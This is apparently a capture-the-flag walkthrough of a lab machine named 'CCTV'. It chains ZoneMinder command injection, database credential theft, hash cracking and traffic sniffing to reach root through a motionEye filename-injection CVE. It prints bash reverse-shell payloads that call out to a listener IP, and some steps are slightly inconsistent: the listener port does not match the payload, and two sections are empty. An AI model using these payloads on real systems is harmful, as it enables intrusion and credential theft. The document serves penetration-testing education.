## Summary

CCTV is a Linux machine centered around surveillance software. The attack chain involves exploiting a command injection in ZoneMinder's monitor source path to gain initial foothold as `www-data`, pivoting to `mark` via MySQL credential extraction and hash cracking, capturing credentials for `sa_mark` via network traffic interception, and finally achieving root through an authenticated RCE in motionEye (CVE-2025-60787) via filename-based command injection.

**Vulnerabilities exploited:**
- ZoneMinder — Command injection via monitor Source Path
- MySQL — Plaintext database credentials in `/etc/zm/zm.conf`
- motionEye 0.43.1b4 — CVE-2025-60787 — Authenticated RCE via `picture_filename` config parameter
- Credential exposure — Service account credentials transmitted in cleartext over loopback

## Initial Access — RCE via ZoneMinder Source Path

### Discovery

ZoneMinder passes the monitor's **Source Path** field directly to `ffmpeg` without sanitization. By injecting a bash reverse shell as part of the source path, the command is executed when the monitor configuration is saved.

### Exploit

With Burp Suite or the web UI, navigate to **Monitor → Source** and set the **Source Path** to:

```bash
;bash -c 'bash -i >& /dev/tcp/10.10.17.60/4444 0>&1';
```

![Source Path field with reverse shell payload](/assets/img/posts/cctv/source_path_payload.png){: width="700" }

Set up a listener on Kali:

```bash
nc -lvnp 4444
```

Save the monitor configuration. A reverse shell is received as `www-data`.

![Reverse shell received as www-data](/assets/img/posts/cctv/wwwdata_shell.png){: width="700" }

## Lateral Movement — www-data → mark

### MySQL Credentials

ZoneMinder stores its database credentials in plaintext:

```bash
cat /etc/zm/zm.conf | grep -i "db"
```

```
ZM_DB_USER=zmuser
ZM_DB_PASS=zmpass
```

![zm.conf credentials](/assets/img/posts/cctv/zmconf_creds.png){: width="700" }

### Extracting Password Hashes

```bash
mysql -u zmuser -pzmpass zm -e "SELECT Username,Password FROM Users;"
```

![MySQL user hashes](/assets/img/posts/cctv/mysql_hashes.png){: width="700" }

Three users found with bcrypt hashes:
- `admin`
- `mark`
- `superadmin`

### Cracking the Hash

Save the hashes to a file and crack with john:

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
john hashes.txt --show
```

![John cracking mark's password](/assets/img/posts/cctv/john_mark.png){: width="700" }

Password cracked: **`opensesame`**

### SSH as mark

## Lateral Movement — mark → sa_mark

### Internal Service Discovery

Enumerating listening ports reveals several internal services:

```bash
ss -tlnp
```

![Internal ports including 8765, 8888, 7999](/assets/img/posts/cctv/ss_ports.png){: width="700" }

Probing each port with curl to identify what is running:

```bash
curl -s http://127.0.0.1:8765
curl -s http://127.0.0.1:8888
curl -s http://127.0.0.1:7999
```

Port **8765** returns an HTML page identifying itself as **motionEye**, a web-based surveillance frontend:

![curl on port 8765 revealing motionEye](/assets/img/posts/cctv/curl_8765.png){: width="700" }

Port **8888** returns a `404 page not found` with a `Server: mediamtx` header — a media streaming server. Port **7999** responds with `Motion 4.7.1 Running` — the Motion daemon webcontrol interface.

Key findings:
- **8765** — motionEye 0.43.1b4 web interface
- **8888** — mediamtx streaming server
- **7999** — Motion daemon webcontrol

### motionEye Runs as Root

Checking the motionEye systemd service confirms it runs as `root`, making it a high-value target for privilege escalation:

```bash
cat /etc/systemd/system/motioneye.service
```

```
[Service]
User=root
ExecStart=/usr/local/bin/meyectl startserver -c /etc/motioneye/motioneye.conf
```

![motioneye.service showing User=root](/assets/img/posts/cctv/motioneye_service_root.png){: width="700" }

Any command execution through motionEye will run with root privileges, making it the primary escalation target.

### Periodic Service Credentials in Cleartext

A log file at `/opt/video/backups/server.log` shows periodic authentication activity as `sa_mark`:

```bash
cat /opt/video/backups/server.log
```

![server.log showing sa_mark authentication](/assets/img/posts/cctv/server_log.png){: width="700" }

Running `tcpdump` on the loopback interface captures the credentials transmitted in cleartext by a Docker container service:

```bash
tcpdump -i any -A -nn 2>/dev/null | grep "sa_mark" &
sleep 180
```

![tcpdump capturing sa_mark credentials](/assets/img/posts/cctv/tcpdump_creds.png){: width="700" }

```
USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info
```

### Switch to sa_mark

## Privilege Escalation — sa_mark → root

### motionEye Admin Access

The motionEye configuration file reveals the admin password hash:

```bash
cat /etc/motioneye/motion.conf | grep admin_password
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

The password for `sa_mark` (`X1l9fx1ZjS7RZb`) produces this SHA1 hash, granting admin access to motionEye.

### CVE-2025-60787 — motionEye RCE via picture_filename

motionEye 0.43.1b4 is vulnerable to authenticated RCE. The `picture_filename` configuration value is stored without sanitization and interpreted by the Motion daemon as a shell command when generating filenames.

**Setup SSH tunnel to access the internal panel:**

```bash
ssh -L 9999:127.0.0.1:8765 mark@10.129.17.56
```

Navigate to `http://127.0.0.1:9999` and log in as `admin` with password `X1l9fx1ZjS7RZb`.

![motionEye admin panel](/assets/img/posts/cctv/motioneye_login.png){: width="700" }

**Bypass client-side validation in browser console (F12):**

```javascript
configUiValid = function() { return true; };
```

**Set the payload in Settings → Still Images → Image File Name:**

```bash
$(bash -c 'bash -i >& /dev/tcp/10.10.17.60/4444 0>&1').%Y-%m-%d-%H-%M-%S
```

Click **Apply** to save the configuration.

![Image File Name field with payload](/assets/img/posts/cctv/motioneye_payload.png){: width="700" }

With a listener running on Kali:

```bash
nc -lvnp 4445
```

Back on the main motionEye dashboard, click the **snapshot button** on the camera view. This triggers an immediate capture and executes the payload.

![Snapshot button on motionEye dashboard](/assets/img/posts/cctv/motioneye_snapshot.png){: width="700" }

A root shell is received since motionEye runs as root (confirmed via `/etc/systemd/system/motioneye.service`).

![Root shell received](/assets/img/posts/cctv/root_shell.png){: width="700" }

```bash

```

![root.txt flag](/assets/img/posts/cctv/root_flag.png){: width="700" }

## Lessons Learned
- Default credentials on surveillance software are extremely common and always worth trying
- Database credential files (like `zm.conf`) are often world-readable
- Internal services on loopback should always be enumerated — they often run with elevated privileges
- Network traffic interception via `tcpdump` can expose credentials transmitted in cleartext between containers and host services
- motionEye running as root with user-controlled filename templates is a direct path to privilege escalation
